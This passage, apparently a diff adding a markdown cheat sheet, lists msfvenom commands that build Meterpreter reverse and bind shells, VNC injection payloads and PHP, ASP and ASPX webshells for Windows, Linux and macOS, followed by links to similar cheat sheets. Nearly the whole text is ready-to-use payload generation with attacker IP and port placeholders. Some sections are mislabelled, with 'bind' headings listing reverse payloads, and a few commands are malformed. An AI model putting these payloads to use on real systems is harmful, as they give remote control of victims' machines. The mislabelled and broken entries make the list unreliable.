+`$ msfvenom -p windows/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x86.exe`
+
+`$ msfvenom -p windows/x64/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x64.exe`
+
+##### 2.5.3.13 - LoadLibrary Windows Exec Payload
+
+`$ msfvenom -p windows/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x86.exe`
+
+`$ msfvenom -p windows/x64/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x64.exe`
+
+### 2.6 - Meterpreter Payloads
+
+#### 2.6.1 - Reverse Meterpreter Shells
+
+##### 2.6.1.1 - Staged Python Meterpreter Reverse Shells
+
+`$ msfvenom -p python/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter/reverse_tcp_ssl lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter/reverse_http lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter/reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o met.py`
+
+##### 2.6.1.2 - Staged Windows Meterpreter Reverse Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter/reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp_dns lhost=<dns_URL> lport=<PORT> -f exe met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter/reverse_named_pipe pipename=<PIPENAME> -f exe -o met-x86.exe`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x64.exe`
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x64.exe`
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met_x86_64.exe`
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_named_pipe pipename=<PIPENAME> -f exe -o met-x64.exe`
+
+##### 2.6.1.2 - Staged Linux Meterpreter Reverse Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o met-x86`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o met-x64`
+
+##### 2.6.1.3 - Staged Mac OSX Meterpreter Reverse Shells
+
+1. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p osx/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f macho -o met-x64`
+
+##### 2.6.1.4 - Staged Reverse Webshells
+
+1. **PHP**
+
+`$ msfvenom -p php/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o met.php`
+
+`$ cat met.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php`
+
+2. **ASP**
+
+- **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f asp -o met-x86.asp`
+
+- **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f asp -o met-x64.asp`
+
+3. ASPX
+
+- **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o met-x86.aspx`
+
+- **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o met-x64.aspx`
+
+##### 2.6.1.5 - Stageless Python Meterpreter Reverse Shells
+
+`$ msfvenom -p python/meterpreter_reverse_http lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o met.py`
+
+##### 2.6.1.6 - Stageless Windows Meterpreter Reverse Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x86-64.exe`
+
+`$ msfvenom -p windows/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x86-64.exe`
+
+`$ msfvenom -p windows/x64/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met-x64.exe`
+
+##### 2.6.1.7 - Stageless Linux Meterpreter Reverse Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p linux/x86/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o met-x86`
+
+`$ msfvenom -p linux/x86/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o met-x86`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p linux/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o met-x64`
+
+`$ msfvenom -p linux/x64/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o met-x64`
+
+##### 2.6.1.7 - Stageless Mac OSX Meterpreter Reverse Shells
+
+1. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p osx/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f macho -o met-x64`
+
+`$ msfvenom -p osx/x64/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f macho -o met-x64`
+
+##### 2.6.1.8 - Stageless Reverse Webshells
+
+1. **PHP**
+
+`$ msfvenom -p php/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f raw > met.php`
+
+`$ cat met.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php`
+
+2. **ASP**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f asp -o met-x86.asp`
+
+- x86-64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f asp -o met-x64.asp`
+
+3. **ASPX**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o met-x86.aspx`
+
+- x86-64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o met-x64.aspx`
+
+#### 2.6.2 - Bind Meterpreter Shells
+
+##### 2.6.2.1 - Staged Python Meterpreter Bind Shells
+
+`$ msfvenom -p python/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter/reverse_tcp_ssl lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter/reverse_http lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter/reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o met.py`
+
+##### 2.6.2.2 - Staged Windows Meterpreter Bind Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/meterpreter/bind_tcp lport=<PORT> -f exe -o met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o met-x86.exe`
+
+`$ msfvenom -p windows/meterpreter/bind_hidden_tcp ahost=<IP> lport=<PORT> -f exe -o hidden-met-x64.exe`
+
+`$ msfvenom -p windows/meterpreter/bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f -o met-x86.exe`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=<PORT> -f exe -o met-x64.exe`
+
+`$ msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o met-x64.exe`
+
+For the SMB pipe the default for LPORT will always be port **445** 
+
+`$ msfvenom -p windows/x64/meterpreter/bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f exe -o met-x64.exe`
+
+##### 2.6.2.3 - Staged Linux Meterpreter Bind Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p linux/x86/meterpreter/bind_tcp lport=<PORT> -f elf -o met-x86`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p linux/x64/meterpreter/bind_tcp lport=<PORT> -f elf -o met-x64`
+
+##### 2.6.2.3 - Staged Mac OSX Meterpreter Bind Shells
+
+1. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p osx/x64/meterpreter/bind_tcp lport=<PORT> -f macho -o met-x64`
+
+##### 2.6.2.3 - Staged Meterpreter Bind Webshells
+
+1. **PHP**
+
+`$ msfvenom -p php/meterpreter/bind_tcp lport=<PORT> -f raw > met.php`
+
+`$ cat met.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php`
+
+2. **ASP**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/meterpreter/bind_tcp lport=<PORT> -f asp -o met-x86.asp`
+
+- x86-64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=<PORT> -f asp -o met-x64.asp`
+
+3. **ASPX**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/meterpreter/bind_tcp lport=<PORT> -f aspx -o met-x86.aspx`
+
+- x86-64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=<PORT> -f aspx -o met-x64.aspx`
+
+##### 2.6.2.4 - Stageless Python Meterpreter Bind Shells
+
+`$ msfvenom -p python/meterpreter_reverse_http lhost=<IP> lport=<PORT> -o met.py`
+
+`$ msfvenom -p python/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o met.py`
+
+##### 2.6.2.5 - Stageless Windows Meterpreter Bind Shells
+
+1. **x86-64 (64-bit) Payloads**
+
+For the SMB pipe the default for LPORT will always be port **445** 
+
+`$ msfvenom -p windows/x64/meterpreter_bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f exe -o met-x86-64.exe`
+
+`$ msfvenom -p windows/x64/meterpreter_bind_tcp lport=<PORT> -f exe -o met-x86-64.exe`
+
+##### 2.6.2.6 - Stageless Mac OSX Meterpreter Bind Shell
+
+TODO: Fill the missing info related stageless mac osx meterpreter bind shells
+
+##### 2.6.2.7 - Stageless Bind Webshells
+
+1. **PHP**
+
+`$ msfvenom -p php/meterpreter_bind_tcp lport=<PORT> -f raw > met.php`
+
+`$ cat met.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php`
+
+2. **ASP**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/meterpreter_bind_tcp lport=<PORT> -f asp -o met-x86.asp`
+
+- x86-64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/meterpreter_bind_tcp lport=<PORT> -f asp -o met-x64.asp`
+
+3. **ASPX**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/meterpreter_bind_tcp lport=<PORT> -f aspx -o met-x86.aspx`
+
+- x86-64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/meterpreter_bind_tcp lport=<PORT> -f aspx -o met-x64.aspx`
+
+### 2.7 - VNC Payloads
+
+#### 2.7.1 - Staged Windows VNC Reverse Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/vncinject/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o vnc-x86.exe`
+
+`$ msfvenom -p windows/vncinject/reverse_http lhost=<IP> lport=<PORT> -f exe -o vnc-x86.exe`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/vncinject/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o vnc-x86-64.exe`
+
+`$ msfvenom -p windows/x64/vncinject/reverse_http lhost=<IP> lport=<PORT> -f exe -o vnc-x86-64.exe`
+
+`$ msfvenom -p windows/x64/vncinject/reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o vnc-x86-64.exe`
+
+#### 2.7.1 - Staged Windows VNC Bind Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/vncinject/bind_tcp rhost=<target_IP> lport=<PORT> -f exe -o vnc-x86.exe`
+
+`$ msfvenom -p cmd/windows/powershell/vncinject/bind_tcp rhost=<target_IP> lport=<PORT> -f raw -o vnc-x86.ps1`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/vncinject/bind_tcp rhost=<target_IP> lport=<PORT> -f exe -o vnc-x86-64.exe`
+
+## References
+
+- [How to XOR with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-XOR-with-Metasploit-Framework-Compiler)
+
+- [How to RC4 with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-decrypt-RC4-with-Metasploit-Framework-Compiler)
+
+- [How to decode Base64 with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-decode-Base64-with-Metasploit-Framework-Compiler)
+
+- [MSFVenom Reverse Shell Payload Cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
+
+- [MSFVenom Cheatsheet Create Metasploit Payloads](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)
+
+- [MSF-Venom Cheatsheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
+
+- [Reverse Shell Cheatsheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+
+- [Hacktricks Shells](https://book.hacktricks.xyz/shells/shells)
+
+- [Hacktricks MSFVenom Shells](https://book.hacktricks.xyz/shells/shells/msfvenom)
+
+- [SMB NamedPipe Pivoting Meterpreter](https://nagarrosecurity.com/blog/smb-named-pipe-pivoting-meterpreter)
+
+- [Get Reverse Shell via Windows One Liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
